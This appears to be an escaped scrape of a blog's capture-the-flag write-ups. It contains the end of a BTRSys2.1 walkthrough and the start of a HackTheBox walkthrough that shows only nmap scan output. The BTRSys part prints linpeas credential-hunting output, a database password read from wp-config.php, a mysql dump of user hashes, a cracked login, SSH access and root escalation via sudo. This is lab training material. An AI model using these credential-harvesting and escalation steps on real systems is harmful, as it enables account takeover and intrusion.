files\r./linpeas.sh: 3147: printf: %1$: invalid directive /var/www/html/wordpress/wp-signup.php: \u0026lt;?php printf( __( \u0026#39;\u0026lt;a href=\u0026#34;http://\r[+] Finding passwords inside key folders (limit 70) - no PHP files\r./linpeas.sh: 3151: printf: %1$: invalid directive [+] Finding possible password variables inside key folders (limit 140)\r/var/www/html/upload/admins/settings/index.php: \u0026#39;DATABASE_HOST\u0026#39; =\u0026gt; \u0026#39;\u0026#39;,\r/var/www/html/upload/admins/settings/index.php: \u0026#39;DATABASE_NAME\u0026#39; =\u0026gt; \u0026#39;\u0026#39;,\r/var/www/html/upload/admins/settings/index.php: \u0026#39;DATABASE_USERNAME\u0026#39; =\u0026gt; \u0026#39;\u0026#39;,\r/var/www/html/upload/languages/CZ.php: \u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Jméno aplikace\u0026#39;,\r/var/www/html/upload/languages/DE.php: \u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Verwaltungswerkzeuge\u0026#39;,\r/var/www/html/upload/languages/DK.php: \u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Applikationsnavn\u0026#39;,\r/var/www/html/upload/languages/EN.php: \u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Application Name\u0026#39;,\r/var/www/html/upload/languages/FI.php: \u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Sovelluksen nimi\u0026#39;, //Application Name\r/var/www/html/upload/languages/FR.php: \u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Nom de l\u0026amp;apos;application\u0026#39;,\r/var/www/html/upload/languages/IT.php: \u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Nome Applicazione\u0026#39;,\r/var/www/html/upload/languages/NL.php: \u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Applicatienaam\u0026#39;,\r/var/www/html/upload/languages/PL.php:\u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Nazwa aplikacji\u0026#39;,\r/var/www/html/upload/languages/RU.php: \u0026#39;APP_NAME\u0026#39; =\u0026gt; \u0026#39;Название приложения\u0026#39;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/bg.js:accesskey: \u0026#34;Бърз клавиш\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/cs.js:accesskey: \u0026#34;Přístupová klávesa\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/de.js:accesskey: \u0026#34;Accesskey\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/dk.js:accesskey: \u0026#34;Accesskey\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/en.js:accesskey: \u0026#34;Accesskey\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/eo.js:accesskey: \u0026#34;Fulmoklavo\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/es.js:accesskey: \u0026#34;Tecla de acceso\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/fi.js:accesskey: \u0026#34;Pikanäppäin\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/fr.js:accesskey: \u0026#34;Accesskey\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/hr.js:accesskey: \u0026#34;Accesskey\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/it.js:accesskey: \u0026#34;Accesskey\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/ja.js:accesskey: \u0026#34;アクセスキー\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/mk.js:accesskey: \u0026#34;Accesskey\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/nl.js:accesskey: \u0026#34;Accessknop\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/pl.js:accesskey: \u0026#34;Alt+\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/pt.js:accesskey: \u0026#34;Accesskey\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/ru.js:accesskey: \u0026#34;Горячая клавиша\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/sk.js:accesskey: \u0026#34;Accesskey\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/langs/zh.js:accesskey: \u0026#34;快捷键\u0026#34;,\r/var/www/html/upload/modules/edit_area/edit_area/template.html: {$accesskey} E: {$toggle}\u0026lt;br /\u0026gt;\r/var/www/html/upload/modules/tiny_mce_4/templates/tiny_mce.lte: filemanager_access_key:\u0026#34;{{ LEPTON_GUID }}\u0026#34; ,\r/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config.php: \u0026#39;access_keys\u0026#39; =\u0026gt; array( LEPTON_GUID ),\r/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config.php:| filemanager_access_key:\u0026#34;myPrivateKey\u0026#34; ,\r/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config_sik.php: \u0026#39;access_keys\u0026#39; =\u0026gt; array( LEPTON_GUID ),\r/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config_sik.php:| filemanager_access_key:\u0026#34;myPrivateKey\u0026#34; ,\r/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/dialog.php:if (USE_ACCESS_KEYS == TRUE){ /var/www/html/upload/templates/algos/templates/settings.htt: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;app_name\u0026#34; value=\u0026#34;{APP_NAME}\u0026#34; /\u0026gt;\r/var/www/html/upload/templates/lepton2/index.php: \u0026lt;label for=\u0026#34;password\u0026#34; accesskey=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;?php echo $TEXT[\u0026#39;PASSWORD\u0026#39;]; ?\u0026gt;:\u0026lt;/label\u0026gt;\r/var/www/html/upload/templates/lepton2/index.php: \u0026lt;label for=\u0026#34;username\u0026#34; accesskey=\u0026#34;1\u0026#34;\u0026gt;\r/var/www/html/wordpress/wp-admin/includes/ms.php: $new_admin_email = array(\r/var/www/html/wordpress/wp-admin/includes/schema.php: \u0026#39;admin_email\u0026#39; =\u0026gt; $site_user-\u0026gt;user_email,\r/var/www/html/wordpress/wp-admin/includes/schema.php: \u0026#39;admin_email\u0026#39; =\u0026gt; \u0026#39;you@example.com\u0026#39;,\r/var/www/html/wordpress/wp-admin/install.php: $admin_email = isset( $_POST[\u0026#39;admin_email\u0026#39;] ) ?trim( wp_unslash( $_POST[\u0026#39;admin_email\u0026#39;] ) ) : \u0026#39;\u0026#39;;\r/var/www/html/wordpress/wp-admin/install.php: $admin_email = isset( $_POST[\u0026#39;admin_email\u0026#39;] ) ? trim( wp_unslash( $_POST[\u0026#39;admin_email\u0026#39;] ) ) : \u0026#39;\u0026#39;;\r/var/www/html/wordpress/wp-admin/options-general.php:$new_admin_email = get_option( \u0026#39;new_admin_email\u0026#39; );\r/var/www/html/wordpress/wp-admin/options-general.php:if ( $new_admin_email \u0026amp;\u0026amp; $new_admin_email != get_option(\u0026#39;admin_email\u0026#39;) ) : ?\u0026gt;\r/var/www/html/wordpress/wp-admin/options.php: } elseif ( ! empty( $_GET[\u0026#39;dismiss\u0026#39;] ) \u0026amp;\u0026amp; \u0026#39;new_admin_email\u0026#39; == $_GET[\u0026#39;dismiss\u0026#39;] ) {\r/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php: $api_key = Akismet::get_api_key();\r/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php: $api_key = array_shift( $responses[0] );\r/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php: \u0026#39;api_key\u0026#39; =\u0026gt; $api_key,\r/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php: $api_key = Akismet::get_api_key();\r/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php: if ( $api_key = Akismet::get_api_key() ) {\r/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet.php: $api_key = self::get_api_key();\r/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet.php: $api_key = self::get_api_key();\r/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php: \u0026lt;?php if ( !defined( \u0026#39;WPCOM_API_KEY\u0026#39; ) ):?\u0026gt;\r/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php: \u0026lt;?php if ( !defined( \u0026#39;WPCOM_API_KEY\u0026#39; ) ):?\u0026gt;\r/var/www/html/wordpress/wp-content/plugins/akismet/wrapper.php:$wpcom_api_key = defined( \u0026#39;WPCOM_API_KEY\u0026#39; ) ? constant( \u0026#39;WPCOM_API_KEY\u0026#39; ) : \u0026#39;\u0026#39;;\r/var/www/html/wordpress/wp-content/plugins/mail-masta/amazon_api/SimpleEmailService.php: $this-\u0026gt;__accessKey = $accessKey;\r/var/www/html/wordpress/wp-content/plugins/mail-masta/amazon_api/SimpleEmailService.php: $this-\u0026gt;__secretKey = $secretKey;\r/var/www/html/wordpress/wp-content/plugins/mail-masta/amazon_api/SimpleEmailService.php: if ($accessKey !== null \u0026amp;\u0026amp; $secretKey !== null) {\r/var/www/html/wordpress/wp-content/plugins/mail-masta/inc/api_settings_ajax.php: $access_key = $_POST[\u0026#39;a\u0026#39;];\r/var/www/html/wordpress/wp-content/plugins/mail-masta/inc/autoresponder/api_settings_ajax.php: $access_key = $_POST[\u0026#39;a\u0026#39;];\r/var/www/html/wordpress/wp-content/plugins/mail-masta/inc/mail-settings-data.php:var accesskey = jQuery(\u0026#34;#access_key\u0026#34;).val();\r/var/www/html/wordpress/wp-content/plugins/mail-masta/inc/mail-settings-data.php:var secretkey = jQuery(\u0026#34;#secret_key\u0026#34;).val();\r/var/www/html/wordpress/wp-includes/js/quicktags.js: var access = this.access ? \u0026#39; accesskey=\u0026#34;\u0026#39; + this.access + \u0026#39;\u0026#34;\u0026#39; : \u0026#39;\u0026#39;;\r/var/www/html/wordpress/wp-includes/media.php: $img_url = str_replace($img_url_basename, wp_basename($thumb_file), $img_url);\r/var/www/html/wordpress/wp-includes/media.php: $img_url = str_replace($img_url_basename, $intermediate[\u0026#39;file\u0026#39;], $img_url);\r[+] Finding possible password in config files\r/etc/debconf.conf passwords.\rpassword\rpasswords.\rpasswords\rpassword\rpasswords.dat\rpasswords and one for everything else.\rpasswords\rpassword is really\rPasswd: secret\r/etc/adduser.conf\rpasswd\r/etc/phpmyadmin/lighttpd.conf\rpasswd\u0026#34;\rpasswd.userfile = \u0026#34;/etc/phpmyadmin/htpasswd.setup\u0026#34;\r/etc/phpmyadmin/apache.conf\rpasswd.setup\r/etc/apache2/apache2.conf\rpasswd files from being\r/etc/init/passwd.conf\rpasswd - clear locks on passwd and related files\rpasswd to avoid million duplicate bug reports\rpasswd locks\u0026#34;\rpasswd.lock /etc/group.lock /etc/subuid.lock /etc/subgid.lock\r/etc/nsswitch.conf\rpasswd: compat\r/etc/sysctl.d/10-ptrace.conf\rcredentials that exist in memory (re-using existing SSH connections,\r[+] Finding \u0026#39;username\u0026#39; string inside key folders (limit 70)\r/var/www/html/upload/account/login.php: \u0026#34;MAX_USERNAME_LEN\u0026#34; =\u0026gt; AUTH_MAX_LOGIN_LENGTH,\r/var/www/html/upload/account/login.php: \u0026#34;MIN_USERNAME_LEN\u0026#34; =\u0026gt; AUTH_MIN_LOGIN_LENGTH,\r/var/www/html/upload/account/login.php: \u0026#34;USERNAME_FIELDNAME\u0026#34; =\u0026gt; $TEXT[\u0026#39;USERNAME\u0026#39;],\r/var/www/html/upload/account/login_form.php: \u0026#39;TEXT_USERNAME\u0026#39; =\u0026gt; $TEXT[\u0026#39;USERNAME\u0026#39;], /var/www/html/upload/account/logout.php:$_SESSION[\u0026#39;USERNAME\u0026#39;] = null;\r/var/www/html/upload/account/signup2.php: $database-\u0026gt;query(\u0026#34;DELETE FROM \u0026#34;.TABLE_PREFIX.\u0026#34;users WHERE username = \u0026#39;$username\u0026#39;\u0026#34;);\r/var/www/html/upload/account/signup2.php:$results = $database-\u0026gt;query(\u0026#34;SELECT user_id FROM \u0026#34;.TABLE_PREFIX.\u0026#34;users WHERE username = \u0026#39;$username\u0026#39;\u0026#34;);\r/var/www/html/upload/account/signup2.php:$username = strtolower(strip_tags($wb-\u0026gt;get_post_escaped(\u0026#39;username\u0026#39;)));\r/var/www/html/upload/account/signup_form.php: \u0026#39;TEXT_USERNAME\u0026#39; =\u0026gt; $TEXT[\u0026#39;USERNAME\u0026#39;],\r/var/www/html/upload/account/templates/login_form.htt: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;{TEXT_USERNAME}\u0026#34; maxlength=\u0026#34;30\u0026#34; style=\u0026#34;width:220px;\u0026#34;/\u0026gt;\r/var/www/html/upload/account/templates/login_form.htt: \u0026lt;td style=\u0026#34;width:100px\u0026#34;\u0026gt;{TEXT_USERNAME}:\u0026lt;/td\u0026gt;\r/var/www/html/upload/account/templates/login_form.htt:\u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;username_fieldname\u0026#34; value=\u0026#34;{TEXT_USERNAME}\u0026#34; /\u0026gt; /var/www/html/upload/account/templates/signup_form.htt: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; maxlength=\u0026#34;30\u0026#34; style=\u0026#34;width:300px;\u0026#34;/\u0026gt;\r/var/www/html/upload/account/templates/signup_form.htt: \u0026lt;td width=\u0026#34;180\u0026#34;\u0026gt;{TEXT_USERNAME}:\u0026lt;/td\u0026gt;\r/var/www/html/upload/admins/groups/groups.php: \u0026#39;TEXT_USERNAME\u0026#39; =\u0026gt; $TEXT[\u0026#39;USERNAME\u0026#39;], /var/www/html/upload/admins/groups/index.php: \u0026#39;TEXT_USERNAME\u0026#39; =\u0026gt; $TEXT[\u0026#39;USERNAME\u0026#39;],\r/var/www/html/upload/admins/login/index.php: $username_fieldname = \u0026#39;username_\u0026#39;.substr($salt, 0, 7);\r/var/www/html/upload/admins/login/index.php: \u0026#39;MAX_USERNAME_LEN\u0026#39; =\u0026gt; AUTH_MAX_LOGIN_LENGTH,\r/var/www/html/upload/admins/login/index.php: \u0026#39;MIN_USERNAME_LEN\u0026#39; =\u0026gt; AUTH_MIN_LOGIN_LENGTH,\r/var/www/html/upload/admins/login/index.php: \u0026#39;USERNAME_FIELDNAME\u0026#39; =\u0026gt; $username_fieldname,\r/var/www/html/upload/admins/logout/index.php:$_SESSION[\u0026#39;USERNAME\u0026#39;] = null;\r/var/www/html/upload/admins/pages/modify.php: \u0026#39;MODIFIED_BY_USERNAME\u0026#39; =\u0026gt; $user[\u0026#39;username\u0026#39;], /var/www/html/upload/admins/pages/sections.php: \u0026#39;MODIFIED_BY_USERNAME\u0026#39; =\u0026gt; $user[\u0026#39;username\u0026#39;], /var/www/html/upload/admins/pages/settings.php: \u0026#39;MODIFIED_BY_USERNAME\u0026#39; =\u0026gt; $user[\u0026#39;username\u0026#39;],\r/var/www/html/upload/admins/preferences/index.php: \u0026#39;TEXT_USERNAME\u0026#39; =\u0026gt; $TEXT[\u0026#39;USERNAME\u0026#39;],\r/var/www/html/upload/admins/settings/index.php: \u0026#39;DATABASE_USERNAME\u0026#39; =\u0026gt; \u0026#39;\u0026#39;,\r/var/www/html/upload/admins/settings/save.php: $settings[\u0026#39;wbmailer_smtp_username\u0026#39;] = $wbmailer_smtp_username;\r/var/www/html/upload/admins/settings/save.php: if (($wbmailer_smtp_username == \u0026#39;\u0026#39;) \u0026amp;\u0026amp; !preg_match($pattern, $wbmailer_smtp_username)) /var/www/html/upload/admins/settings/setting.js: document.getElementById(\u0026#39;row_wbmailer_smtp_username\u0026#39;).style.display = \u0026#39;\u0026#39;;\r/var/www/html/upload/admins/settings/setting.js: document.getElementById(\u0026#39;row_wbmailer_smtp_username\u0026#39;).style.display = \u0026#39;none\u0026#39;;\r/var/www/html/upload/admins/settings/setting.js: document.getElementById(\u0026#39;row_wbmailer_smtp_username\u0026#39;).style.display = \u0026#39;\u0026#39;;\r/var/www/html/upload/admins/settings/setting.js: document.getElementById(\u0026#39;row_wbmailer_smtp_username\u0026#39;).style.display = \u0026#39;none\u0026#39;;\r/var/www/html/upload/admins/users/add.php: \u0026#39;username\u0026#39; =\u0026gt; addslashes($username), /var/www/html/upload/admins/users/add.php:$_SESSION[\u0026#39;au\u0026#39;][\u0026#39;username\u0026#39;] = $username;\r/var/www/html/upload/admins/users/add.php:$results = $database-\u0026gt;query(\u0026#34;SELECT user_id FROM \u0026#34;.TABLE_PREFIX.\u0026#34;users WHERE username = \u0026#39;$username\u0026#39;\u0026#34;);\r/var/www/html/upload/admins/users/add.php:$username = strtolower($admin-\u0026gt;get_post_escaped($username_fieldname));\r/var/www/html/upload/admins/users/add.php:$username_fieldname = $admin-\u0026gt;get_post_escaped(\u0026#39;username_fieldname\u0026#39;);\r/var/www/html/upload/admins/users/index.php: $username_fieldname .= $salt[ $num ];\r/var/www/html/upload/admins/users/index.php: \u0026#39;TEXT_USERNAME\u0026#39; =\u0026gt; $TEXT[\u0026#39;USERNAME\u0026#39;],\r/var/www/html/upload/admins/users/index.php: \u0026#39;USERNAME_FIELDNAME\u0026#39; =\u0026gt; $username_fieldname,\r/var/www/html/upload/admins/users/index.php:$username = (isset($_SESSION[\u0026#39;au\u0026#39;][\u0026#39;username\u0026#39;])) ? $_SESSION[\u0026#39;au\u0026#39;][\u0026#39;username\u0026#39;] : \u0026#39;\u0026#39;; /var/www/html/upload/admins/users/index.php:$username_fieldname = \u0026#39;username_\u0026#39;;\r/var/www/html/upload/admins/users/save.php:$username = $admin-\u0026gt;get_post_escaped( $username_fieldname ); /var/www/html/upload/admins/users/save.php:if ($username != \u0026#39;admin\u0026#39;) $fields[ \u0026#39;username\u0026#39; ] = $username; /var/www/html/upload/admins/users/users.php: \u0026#39;USERNAME\u0026#39; =\u0026gt; $user[\u0026#39;username\u0026#39;],\r/var/www/html/upload/admins/users/users.php: \u0026#39;TEXT_USERNAME\u0026#39; =\u0026gt; $TEXT[\u0026#39;USERNAME\u0026#39;], /var/www/html/upload/admins/users/users.php: \u0026#39;USERNAME_FIELDNAME\u0026#39; =\u0026gt; $username_fieldname, /var/www/html/upload/admins/users/users.php: $username_fieldname = \u0026#39;username_\u0026#39;. random_string( AUTH_MIN_PASS_LENGTH + mt_rand(0, 4), \u0026#39;pass\u0026#39; );\r/var/www/html/upload/framework/class.admin_phplib.php: $user[\u0026#39;username\u0026#39;] = \u0026#39;unknown\u0026#39;;\r/var/www/html/upload/framework/class.admin_twig.php: $user[\u0026#39;username\u0026#39;] = \u0026#39;unknown\u0026#39;;\r/var/www/html/upload/framework/class.login.php: \u0026#39;MAX_USERNAME_LEN\u0026#39; =\u0026gt; $this-\u0026gt;max_username_len,\r/var/www/html/upload/framework/class.login.php: \u0026#39;TEXT_USERNAME\u0026#39; =\u0026gt; $TEXT[\u0026#39;USERNAME\u0026#39;],\r/var/www/html/upload/framework/class.login.php: \u0026#39;USERNAME\u0026#39; =\u0026gt; $this-\u0026gt;username, /var/www/html/upload/framework/class.login.php: \u0026#39;USERNAME_FIELDNAME\u0026#39; =\u0026gt; $this-\u0026gt;username_fieldname, /var/www/html/upload/framework/class.login.php: $_SESSION[\u0026#39;USERNAME\u0026#39;] = $results_array[\u0026#39;username\u0026#39;]; /var/www/html/upload/framework/class.login.php: $this-\u0026gt;username_len = strlen($this-\u0026gt;username);\r/var/www/html/upload/framework/class.login.php: $username_fieldname = $this-\u0026gt;get_post(\u0026#39;username_fieldname\u0026#39;);\r/var/www/html/upload/framework/class.login.php: $username_fieldname = \u0026#39;username\u0026#39;;\r/var/www/html/upload/framework/class.login.php: $loginname = ( preg_match(\u0026#39;/[\\;\\=\\\u0026amp;\\|\\\u0026lt;\\\u0026gt; ]/\u0026#39;,$this-\u0026gt;username) ? \u0026#39;\u0026#39; : $this-\u0026gt;username );\r/var/www/html/upload/framework/class.login.php: $this-\u0026gt;max_username_len = AUTH_MIN_LOGIN_LENGTH;\r/var/www/html/upload/framework/class.login.php: $this-\u0026gt;username = htmlspecialchars (strtolower($this-\u0026gt;get_post($username_fieldname)), ENT_QUOTES);\r/var/www/html/upload/framework/class.login.php: if ($this-\u0026gt;get_post(\u0026#39;username_fieldname\u0026#39;) != \u0026#39;\u0026#39;){ /var/www/html/upload/framework/class.login.php: if($this-\u0026gt;get_post($username_fieldname) != \u0026#39;\u0026#39;) { /var/www/html/upload/framework/class.login.php: } elseif($this-\u0026gt;username == \u0026#39;\u0026#39; AND $this-\u0026gt;password == \u0026#39;\u0026#39;) {\r/var/www/html/upload/framework/class.login.php: } elseif($this-\u0026gt;username == \u0026#39;\u0026#39;) {\r/var/www/html/upload/framework/class.login.php: private $username_fieldname = \u0026#34;\u0026#34;;\r/var/www/html/upload/framework/class.login.php: public $max_username_len = 3; //see [1];\r/var/www/html/upload/framework/class.wb.php: return isset( $_SESSION[ \u0026#39;USERNAME\u0026#39; ] ) ? $_SESSION[ \u0026#39;USERNAME\u0026#39; ] : \u0026#39;\u0026#39;; /var/www/html/upload/framework/class.wbmailer.php: $this-\u0026gt;Username = WBMAILER_SMTP_USERNAME; // set SMTP username\r/var/www/html/upload/languages/CZ.php: \u0026#39;LOGIN_USERNAME_BLANK\u0026#39; =\u0026gt; \u0026#39;Zadejte uživateslké jméno\u0026#39;,\r[+] Searching specific hashes inside files - less false positives (limit 70) cat wp-config.php // ** MySQL settings - You can get this info from your web host ** //\r/** The name of the database for WordPress */\rdefine(\u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39;);\r/** MySQL database username */\rdefine(\u0026#39;DB_USER\u0026#39;, \u0026#39;root\u0026#39;);\r/** MySQL database password */\rdefine(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;rootpassword!\u0026#39;);\r/** MySQL hostname */\rdefine(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); mysql -u root -p rootpassword! use wordpress; select * from wp_user; mysql\u0026gt; select * from wp_users; select * from wp_users; +----+------------+----------------------------------+---------------+-------------------+----------+-----------------------------------------+-------------+--------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered user_activation_key | user_status | display_name | +----+------------+----------------------------------+---------------+-------------------+----------+-----------------------------------------+-------------+--------------+ | 1 | root | a318e4507e5a74604aafb45e4741edd3 | btrisk | mdemir@btrisk.com | | 2017-04-24 17:37:04 | 0 | btrisk | | 2 | admin | 21232f297a57a5a743894a0e4a801fc3 | admin | ikaya@btrisk.com | | 2017-04-24 17:37:04 | 4 | admin | +----+------------+----------------------------------+---------------+-------------------+----------+-----------------------------------------+-------------+--------------+ 2 rows in set (0.00 sec) 解密得到btrisk:roottoor\nssh btrisk@192.168.195.50\rsudo -l\rsudo passwd root sudo python3 -c \u0026#39;import pty; pty.spawn (\u0026#34;/bin/bash\u0026#34;)\u0026#39; ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/btrsys2.1/","summary":"┌──(root㉿kali)-[~] └─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.50 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 10:40 CST Nmap scan report for 192.168.213.50 Host is up (0.18s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: |","title":""},{"content":"nmap -sS -sV -p- --min-rate 5000 10.129.227.211 ┌──(root㉿kali)-[~/桌面/vpn]\r└─# netstat -antlp\rActive Internet connections (servers and established)\rProto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 192.168.199.128:58988 209.58.165.155:443 ESTABLISHED 15050/openvpn ┌──(root㉿kali)-[~/桌面/vpn]\r└─# nmap -sS -sV -p- --min-rate 5000 10.129.227.211 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 09:53 CST\rStats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 7.72% done; ETC: 09:53 (0:00:12 remaining)\rStats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 13.12% done; ETC: 09:53 (0:00:13 remaining)\rStats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\rNSE Timing: About 83.33% done; ETC: 09:53 (0:00:00 remaining)\rStats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\rNSE Timing: About 83.33% done; ETC: 09:53 (0:00:00 remaining)\rNmap scan report for 10.129.227.211\rHost is up (0.19s latency).\rNot shown: 65532 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\r53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux)\r80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 24.95 seconds\r┌──(root㉿kali)-[~/桌面/vpn]\r└─# nmap -sS -sV -p- -V --min-rate 5000 10.129.227.211\rNmap version 7.93 ( https://nmap.org )\rPlatform: x86_64-pc-linux-gnu\rCompiled with: liblua-5.3.6 openssl-3.0.8 libssh2-1.10.0 libz-1.2.13 libpcre-8.39 nmap-libpcap-1.7.3 nmap-libdnet-1.12 ipv6\rCompiled without:\rAvailable nsock engines: epoll poll select\r┌──(root㉿kali)-[~/桌面/vpn]\r└─# nmap -sS -sV -p- -A --min-rate 5000 10.129.227.211\rStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 09:55 CST\rStats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan\rParallel DNS resolution of 1 host. Timing: About 0.00% done\rStats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan\rParallel DNS resolution of 1 host. Timing: About 0.00% done\rStats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 1.76% done; ETC: 09:55 (0:00:00 remaining)\rStats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 9.13% done; ETC: 09:55 (0:00:10 remaining)\rStats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 12.07% done; ETC: 09:55 (0:00:15 remaining)\rStats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 14.58% done; ETC: 09:55 (0:00:12 remaining)\rStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 16.45% done; ETC: 09:55 (0:00:10 remaining)\rStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 20.15% done; ETC: 09:55 (0:00:12 remaining)\rStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 20.57% done; ETC: 09:55 (0:00:12 remaining)\rStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 20.97% done; ETC: 09:55 (0:00:11 remaining)\rStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 21.28% done; ETC: 09:55 (0:00:11 remaining)\rStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 21.71% done; ETC: 09:55 (0:00:11 remaining)\rStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 22.10% done; ETC: 09:55 (0:00:11 remaining)\rStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 22.43% done; ETC: 09:55 (0:00:10 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 22.87% done; ETC: 09:55 (0:00:10 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 23.26% done; ETC: 09:55 (0:00:10 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 23.48% done; ETC: 09:55 (0:00:10 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 24.02% done; ETC: 09:55 (0:00:09 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 24.12% done; ETC: 09:55 (0:00:09 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 24.58% done; ETC: 09:55 (0:00:09 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 24.79% done; ETC: 09:55 (0:00:09 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 25.17% done; ETC: 09:55 (0:00:09 remaining)\rStats: 0:00:06 elapsed; 0 